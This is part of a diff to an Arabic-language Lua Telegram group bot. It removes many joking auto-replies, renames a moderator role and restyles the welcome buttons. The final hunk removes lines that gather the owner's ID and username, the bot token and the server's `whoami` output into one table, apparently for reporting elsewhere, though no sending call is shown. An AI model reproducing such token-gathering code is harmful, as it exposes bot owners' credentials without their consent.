-send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 🤗🥰](t.me/p_120o)')
-return false
-end
-if text == 'مح' or text == 'هات مح' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[محات حياتي يروحي 🌝❤️](t.me/p_120o)')
-return false
-end
-if text == 'هلا' or text == 'اهلا' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي 👋💛](t.me/p_120o)')
-return false
-end
-if text == 'هشش' or text == 'اششش' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي 🐣😹](t.me/p_120o)')
-return false
-end
-if text == 'الحمد الله' or text == 'بخير الحمد الله' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[دايما ياحبيبي 🌝❤️](t.me/p_120o)')
-return false
-end
-if text == 'بف' or text == 'بص بف' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف 🥺💔](t.me/p_120o)')
-return false
-end
-if text == 'صباح الخير' or text == 'مساء الخير' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[انت الخير يعمري 🌝❤️](t.me/p_120o)')
-return false
-end
-if text == 'خاص' or text == 'بص خاص' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[ونجيب اشخاص 😂😜](t.me/p_120o)')
-return false
-end
-if text == 'سلام عليكم' or text == 'السلام عليكم' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[وعليكم السلام 🌝❤️](t.me/p_120o)')
-return false
-end
-if text == 'حصل' or text == 'حثل' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[خخخ امال 😹](t.me/p_120o)')
-return false
-end 
-if text == 'اه' or text == 'اها' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/p_120o)')
-return false
-end
-if text == 'كسم' or text == 'كسمك' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[عيب ياوسخ 🙄💔](t.me/p_120o)')
-return false
-end
-if text == 'بوتي' or text == 'يا بوتي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[روح وعقل بوتك 🥺💔](t.me/p_120o)')
-return false
-end
-if text == 'متيجي' or text == 'تع' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[لا عيب بتكسف 😹💔](t.me/p_120o)')
-return false
-end
-if text == 'هيح' or text == 'لسه صاحي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[صح النوم 😹💔](t.me/p_120o)')
-return false
-end
-if text == 'صباح النور' or text == 'باح خير' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[صباح العسل 😻🤍](t.me/p_120o)')
-return false
-end
-if text == 'منور' or text == 'نورت' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي 🌝💙](t.me/p_120o)')
-return false
-end
-if text == 'باي' or text == 'انا ماشي' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى 🥺💔](t.me/p_120o)')
-return false
-end
-if text == 'ويت' or text == 'ويتت' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[اي الثقافه دي 😒😹](t.me/p_120o)')
-return false
-end
-if text == 'خخخخخ' or text == 'خخخخخخخخخخ' then
-local my_ph = bot_data:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
-if not my_ph then
-send(msg.chat_id_, msg.id_,"  ") 
-return false  
-end
-send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا 😒😹](t.me/p_120o)')
-return false
-end
 if string.find(text,"ضافني") or string.find(text,"ضفني") then
 if not bot_data:get(bot_id..'Added:Me'..msg.chat_id_) then
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
@@ -14974,7 +14572,7 @@ keyboard.inline_keyboard = {
 {
 {text = '• مطور •', callback_data="/t7kmrtb1_2 "..userid},{text = '• مطور ثانوي •', callback_data="/t7kmrtb1_1 "..userid},
 },
-{{text = '• انتيمي •', callback_data="/t7kmrtb2_320 "..userid}},
+{{text = '• مساعد •', callback_data="/t7kmrtb2_320 "..userid}},
 {
 {text = '• منشئ •', callback_data="/t7kmrtb1_5 "..userid},{text = '• منشئ اساسي •', callback_data="/t7kmrtb1_4 "..userid},
 },
@@ -15006,7 +14604,7 @@ keyboard.inline_keyboard = {
 {
 {text = '• مطور •', callback_data="/t7kmrtb2_2 "..userid},{text = '• مطور ثانوي •', callback_data="/t7kmrtb2_1 "..userid},
 },
-{{text = '• انتيمي •', callback_data="/t7kmrtb2_300 "..userid}},
+{{text = '• مساعد •', callback_data="/t7kmrtb2_300 "..userid}},
 {
 {text = '• منشئ •', callback_data="/t7kmrtb2_5 "..userid},{text = '• منشئ اساسي •', callback_data="/t7kmrtb2_4 "..userid},
 },
@@ -15056,7 +14654,7 @@ https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callb
 return false
 end
 bot_data:sadd(bot_id.."msa3d:leg", userid)
-Reply_Status(msg,userid,"reply"," 🌝 تم ترقيته انتيمي في البوت")  
+Reply_Status(msg,userid,"reply"," 🌝 تم ترقيته مساعد في البوت")  
 return false 
 end
 
@@ -16846,11 +16444,11 @@ end
 
 if Text == '/HHH' then
 local Teext =[[
-W𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 S𝐨𝐮𝐫𝐜𝐞 𝗥𝗼𝗱𝗹𝗻𝗮۩
+𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 𝑹𝑶𝑫𝑰𝑵𝑨
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '• ᴍʏ ᴅᴇᴠ', callback_data="/mydev"},{text = '• ᴍʏ ᴄʜᴀɴɴᴇʟ', callback_data="/channel"}},
+{{text = '•𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑬𝑹𝑺', callback_data="/mydev"},{text = '•𝑪𝑯', callback_data="/channel"}},
 {{text = 'مـطـوري♡', url="http://t.me/"..sudos.UserName}},
 {{text = 'اضف البوت لمجموعتك♡' ,url="t.me/"..dofile("./Bkar.lua").botUserName.."?startgroup=start"}}, 
 }
@@ -16858,7 +16456,7 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/mydev' then
 local Teext =[[
-W𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 S𝐨𝐮𝐫𝐜𝐞 𝗥𝗼𝗱𝗹𝗻𝗮۩
+𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 𝑹𝑶𝑫𝑰𝑵𝑨
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -16869,7 +16467,7 @@ return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption
 end
 if Text == '/channel' then
 local Teext =[[
-W𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 S𝐨𝐮𝐫𝐜𝐞 𝗥𝗼𝗱𝗹𝗻𝗮۩
+𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 𝑹𝑶𝑫𝑰𝑵𝑨
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -16885,7 +16483,7 @@ W𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 S𝐨𝐮𝐫𝐜𝐞 𝗥𝗼𝗱𝗹𝗻�
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '• ᴍʏ ᴅᴇᴠ', callback_data="/mydev"},{text = '• ᴍʏ ᴄʜᴀɴɴᴇʟ', callback_data="/channel"}},
+{{text = '•𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑬𝑹𝑺', callback_data="/mydev"},{text = '• 𝑪𝑯', callback_data="/channel"}},
 {{text = 'مـطـوري♡', url="http://t.me/"..sudos.UserName}},
 {{text = '• القائمه الرئيسيه •', callback_data="/XXX"}},
 }
@@ -20337,11 +19935,6 @@ end
 end,nil)
 ------------------------------------------------------------------------
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
-infotnseb = {}
-infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID"))
-infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME"))
-infotnseb.tokenbot = (token or bot_data:get(id_server..":token"))
-infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
 local list = bot_data:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
